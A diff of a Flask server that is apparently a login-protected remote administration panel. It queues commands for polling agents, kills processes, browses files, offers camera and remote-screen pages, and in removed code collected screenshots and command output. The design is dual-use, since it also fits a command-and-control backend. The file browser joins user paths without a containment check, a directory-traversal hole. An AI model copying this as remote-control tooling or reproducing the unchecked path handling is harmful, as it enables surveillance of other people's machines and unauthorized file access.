+            CONNECTED_AGENTS[agent_id]["cpu"] = data.get("cpu", 0)
+            CONNECTED_AGENTS[agent_id]["ram"] = data.get("ram", 0)
+            
+            cmd = CONNECTED_AGENTS[agent_id].get("pending_cmd")
+            CONNECTED_AGENTS[agent_id]["pending_cmd"] = None
+            return jsonify({"status": "ok", "cmd": cmd})
+    return jsonify({"error": "not registered"}), 404
+
+@app.route("/api/agent/send_cmd", methods=["POST"])
+@login_required
+def agent_send_cmd():
+    data = request.get_json(force=True) or {}
+    agent_id = data.get("agent_id")
+    cmd = data.get("cmd")
+    with AGENTS_LOCK:
+        if agent_id in CONNECTED_AGENTS:
+            CONNECTED_AGENTS[agent_id]["pending_cmd"] = cmd
+            return jsonify({"ok": True})
+    return jsonify({"error": "agent not found"}), 404
+
+# --- Processes Routes ---
+@app.route("/processes")
+@login_required
+def processes_page():
+    theme = session.get('theme', DEFAULT_THEME)
+    neon, muted = get_theme_colors(theme)
+    return render_template_string(PROCESSES_TEMPLATE, neon=neon, muted=muted)
+
+@app.route("/api/processes")
+@login_required
 def api_processes():
-    hwid = request.args.get('hwid')
-    if not hwid or hwid not in AGENTS: return jsonify([])
-    return jsonify(AGENTS[hwid].get('processes', []))
+    if not psutil:
+        return jsonify({"processes": []})
+    q = request.args.get("q", "").lower()
+    procs = []
+    for p in psutil.process_iter(["pid", "name", "memory_info"]):
+        try:
+            name = p.info["name"] or ""
+            pid = p.info["pid"]
+            if q and (q not in name.lower() and q != str(pid)):
+                continue
+            procs.append({
+                "pid": pid,
+                "name": name,
+                "ram": round(p.info["memory_info"].rss / 1024 / 1024, 1)
+            })
+        except Exception:
+            pass
+    return jsonify({"processes": sorted(procs, key=lambda x: x["name"].lower())[:100]})
 
-@app.route('/api/process/kill', methods=['POST'])
-def api_kill_process():
-    hwid = request.json.get('hwid')
-    pid = request.json.get('pid')
-    if hwid and pid:
-        if hwid not in COMMAND_QUEUES: COMMAND_QUEUES[hwid] = []
-        COMMAND_QUEUES[hwid].append({'type': 'kill_proc', 'payload': pid})
-    return jsonify({'status': 'queued'})
+@app.route("/api/process/kill", methods=["POST"])
+@login_required
+def api_process_kill():
+    pid = request.form.get("pid")
+    if pid and psutil:
+        try:
+            psutil.Process(int(pid)).kill()
+            return "ok"
+        except Exception:
+            pass
+    return "fail", 400
 
-# --- AGENT API (Зв'язок із ПК) ---
-@app.route('/api/agent/report', methods=['POST'])
-def agent_report():
-    data = request.json or {}
-    hwid = data.get('hwid')
-    if not hwid: return jsonify({'error': 'No HWID'}), 400
+# --- File System Routes ---
+@app.route("/files")
+@login_required
+def files_root():
+    return redirect(url_for("files_navigate", path=""))
 
-    if hwid not in AGENTS:
-        AGENTS[hwid] = {}
-        COMMAND_QUEUES[hwid] = []
-
-    # Оновлюємо стан конкретного ПК
-    AGENTS[hwid]['last_seen'] = time.time()
-    AGENTS[hwid]['hostname'] = data.get('hostname', 'Unknown')
-    AGENTS[hwid]['cpu'] = data.get('cpu', 0)
-    AGENTS[hwid]['ram'] = data.get('ram', 0)
-    AGENTS[hwid]['processes'] = data.get('processes', [])
+@app.route("/files/navigate")
+@login_required
+def files_navigate():
+    rel = request.args.get("path", "").lstrip("/\\")
+    full_path = os.path.abspath(os.path.join(BASE_DIR, rel))
     
-    img_b64 = data.get('screenshot')
-    if img_b64:
-        AGENTS[hwid]['screenshot'] = base64.b64decode(img_b64)
-        
-    cmd_out = data.get('cmd_output')
-    if cmd_out:
-        AGENTS[hwid]['cmd_output'] = cmd_out
-        
-    # Віддаємо чергу команд ДЛЯ ЦЬОГО ПК
-    pending_cmds = list(COMMAND_QUEUES.get(hwid, []))
-    COMMAND_QUEUES[hwid] = []
-    
-    return jsonify({'commands': pending_cmds})
+    if not os.path.exists(full_path):
+        full_path = BASE_DIR
+        rel = ""
 
-if __name__ == '__main__':
-    print("🚀 Мульти-Сервер запущено на http://0.0.0.0:5000")
-    app.run(host='0.0.0.0', port=5000, debug=False)
+    items = []
+    try:
+        with os.scandir(full_path) as it:
+            for entry in it:
+                items.append({
+                    "name": entry.name,
+                    "is_dir": entry.is_dir(),
+                    "size": entry.stat().st_size if entry.is_file() else "-",
+                    "rel": os.path.join(rel, entry.name).replace("\\", "/")
+                })
+    except Exception:
+        pass
+
+    items.sort(key=lambda x: (not x["is_dir"], x["name"].lower()))
+    parent = os.path.dirname(rel) if rel else None
+    theme = session.get('theme', DEFAULT_THEME)
+    neon, muted = get_theme_colors(theme)
+
+    return render_template_string(
+        FILES_TEMPLATE,
+        files=items,
+        current_path="/" + rel,
+        parent=parent,
+        neon=neon,
+        muted=muted
+    )
+
+# --- Camera Page ---
+@app.route("/camera")
+@login_required
+def camera_page():
+    theme = session.get('theme', DEFAULT_THEME)
+    neon, muted = get_theme_colors(theme)
+    return render_template_string(CAMERA_TEMPLATE, cv2=CV2_AVAILABLE, neon=neon, muted=muted)
+
+# --- Remote Page ---
+@app.route("/remote")
+@login_required
+def remote_page():
+    theme = session.get('theme', DEFAULT_THEME)
+    neon, muted = get_theme_colors(theme)
+    return render_template_string(REMOTE_TEMPLATE, neon=neon, muted=muted)
+
+@app.route("/fullscreen")
+@login_required
+def fullscreen_page():
+    theme = session.get('theme', DEFAULT_THEME)
+    neon, muted = get_theme_colors(theme)
+    return render_template_string(FULLSCREEN_TEMPLATE, neon=neon, muted=muted)
+
+# --- Theme Switcher ---
+@app.route("/set_theme", methods=["POST"])
+@login_required
+def set_theme():
+    data = request.get_json() or {}
+    theme = data.get("theme")
+    if theme in THEMES:
+        session['theme'] = theme
+        neon, muted = get_theme_colors(theme)
+        return jsonify({"ok": True, "theme": theme, "neon": neon, "muted": muted})
+    return jsonify({"error": "invalid theme"}), 400
+
+# --- HTML Templates ---
+
+LOGIN_TEMPLATE = r"""
